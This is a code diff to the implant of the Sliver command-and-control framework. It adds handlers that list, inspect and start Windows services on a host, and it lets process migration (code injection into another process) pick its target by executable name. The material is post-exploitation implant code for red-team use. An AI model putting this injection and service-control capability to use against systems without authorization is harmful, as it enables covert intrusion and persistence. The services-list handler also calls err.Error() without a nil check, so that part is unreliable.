@@ -25,6 +25,7 @@ import (
 	"io"
 	"os"
 	"runtime"
+	"strings"
 
 	// {{if .Config.Debug}}
 	"log"
@@ -36,6 +37,7 @@ import (
 	"github.com/bishopfox/sliver/implant/sliver/extension"
 	"github.com/bishopfox/sliver/implant/sliver/priv"
 	"github.com/bishopfox/sliver/implant/sliver/procdump"
+	"github.com/bishopfox/sliver/implant/sliver/ps"
 	"github.com/bishopfox/sliver/implant/sliver/registry"
 	"github.com/bishopfox/sliver/implant/sliver/service"
 	"github.com/bishopfox/sliver/implant/sliver/spoof"
@@ -86,6 +88,9 @@ var (
 		sliverpb.MsgRegistryDeleteKeyReq:   regDeleteKeyHandler,
 		sliverpb.MsgRegistrySubKeysListReq: regSubKeysListHandler,
 		sliverpb.MsgRegistryListValuesReq:  regValuesListHandler,
+		sliverpb.MsgServicesReq:            servicesListHandler,
+		sliverpb.MsgServiceDetailReq:       serviceDetailHandler,
+		sliverpb.MsgStartServiceByNameReq:  startServiceByNameHandler,
 
 		// Generic
 		sliverpb.MsgPing:           pingHandler,
@@ -452,6 +457,7 @@ func migrateHandler(data []byte, resp RPCResponse) {
 	log.Println("migrateHandler: RemoteTask called")
 	// {{end}}
 	migrateReq := &sliverpb.InvokeMigrateReq{}
+	var migrateResp sliverpb.Migrate = sliverpb.Migrate{}
 	err := proto.Unmarshal(data, migrateReq)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -459,21 +465,60 @@ func migrateHandler(data []byte, resp RPCResponse) {
 		// {{end}}
 		return
 	}
-	err = taskrunner.RemoteTask(int(migrateReq.Pid), migrateReq.Data, false)
-	// {{if .Config.Debug}}
-	log.Println("migrateHandler: RemoteTask called")
-	// {{end}}
-	migrateResp := &sliverpb.Migrate{Success: true}
-	if err != nil {
-		migrateResp.Success = false
-		migrateResp.Response = &commonpb.Response{
-			Err: err.Error(),
+
+	if migrateReq.Pid == 0 {
+		if migrateReq.ProcName == "" {
+			// {{if .Config.Debug}}
+			log.Println("pid nor process name were specified")
+			// {{end}}
+			migrateResp.Success = false
+			migrateResp.Response = &commonpb.Response{}
+		} else {
+			// Search for the PID
+			processes, err := ps.Processes()
+			if err != nil {
+				// {{if .Config.Debug}}
+				log.Printf("failed to list procs %v", err)
+				// {{end}}
+				migrateResp.Success = false
+				migrateResp.Response = &commonpb.Response{}
+			} else {
+				for _, proc := range processes {
+					if strings.EqualFold(proc.Executable(), migrateReq.ProcName) {
+						migrateReq.Pid = uint32(proc.Pid())
+						break
+					}
+				}
+				if migrateReq.Pid == 0 {
+					// If the Pid is still zero after grabbing a list of processes, then the process name does not exist
+					// {{if .Config.Debug}}
+					log.Printf("Could not find process with name %s", migrateReq.ProcName)
+					// {{end}}
+					migrateResp.Success = false
+					migrateResp.Response = &commonpb.Response{}
+				}
+			}
 		}
-		// {{if .Config.Debug}}
-		log.Println("migrateHandler: RemoteTask failed:", err)
-		// {{end}}
 	}
-	data, err = proto.Marshal(migrateResp)
+
+	if migrateResp.Response == nil {
+		err = taskrunner.RemoteTask(int(migrateReq.Pid), migrateReq.Data, false)
+		// {{if .Config.Debug}}
+		log.Println("migrateHandler: RemoteTask called")
+		// {{end}}
+		migrateResp = sliverpb.Migrate{Success: true, Pid: migrateReq.Pid}
+		if err != nil {
+			migrateResp.Success = false
+			migrateResp.Response = &commonpb.Response{
+				Err: err.Error(),
+			}
+			// {{if .Config.Debug}}
+			log.Println("migrateHandler: RemoteTask failed:", err)
+			// {{end}}
+		}
+	}
+
+	data, err = proto.Marshal(&migrateResp)
 	resp(data, err)
 }
 
@@ -549,6 +594,25 @@ func stopService(data []byte, resp RPCResponse) {
 			Err: err.Error(),
 		}
 	}
+	data, err = proto.Marshal(svcInfo)
+	resp(data, err)
+}
+
+func startServiceByNameHandler(data []byte, resp RPCResponse) {
+	startServiceReq := &sliverpb.StartServiceByNameReq{}
+	err := proto.Unmarshal(data, startServiceReq)
+	if err != nil {
+		return
+	}
+
+	err = service.StartServiceByName(startServiceReq.ServiceInfo.Hostname, startServiceReq.ServiceInfo.ServiceName)
+	svcInfo := &sliverpb.ServiceInfo{}
+	if err != nil {
+		svcInfo.Response = &commonpb.Response{
+			Err: err.Error(),
+		}
+	}
+
 	data, err = proto.Marshal(svcInfo)
 	resp(data, err)
 }
@@ -733,6 +797,55 @@ func getPrivsHandler(data []byte, resp RPCResponse) {
 	}
 
 	data, err = proto.Marshal(getPrivsResp)
+	resp(data, err)
+}
+
+func servicesListHandler(data []byte, resp RPCResponse) {
+	servicesReq := &sliverpb.ServicesReq{}
+	err := proto.Unmarshal(data, servicesReq)
+	if err != nil {
+		return
+	}
+
+	serviceInfo, err := service.ListServices(servicesReq.Hostname)
+	/*
+		Errors from listing the services are not fatal. The client can
+		display a message to the user about the issue
+		We still want other errors like timeouts to be handled in the
+		normal way.
+	*/
+	servicesResp := &sliverpb.Services{
+		Details:  serviceInfo,
+		Error:    err.Error(),
+		Response: &commonpb.Response{},
+	}
+
+	data, err = proto.Marshal(servicesResp)
+	resp(data, err)
+}
+
+func serviceDetailHandler(data []byte, resp RPCResponse) {
+	serviceDetailReq := &sliverpb.ServiceDetailReq{}
+	err := proto.Unmarshal(data, serviceDetailReq)
+	if err != nil {
+		return
+	}
+
+	serviceDetail, err := service.GetServiceDetail(serviceDetailReq.ServiceInfo.Hostname, serviceDetailReq.ServiceInfo.ServiceName)
+	serviceDetailResp := &sliverpb.ServiceDetail{
+		Detail:   serviceDetail,
+		Response: &commonpb.Response{},
+	}
+	if err != nil {
+		if serviceDetail != nil {
+			// Then we had a non-fatal error
+			serviceDetailResp.Message = err.Error()
+		} else {
+			serviceDetailResp.Response.Err = err.Error()
+		}
+	}
+
+	data, err = proto.Marshal(serviceDetailResp)
 	resp(data, err)
 }
 
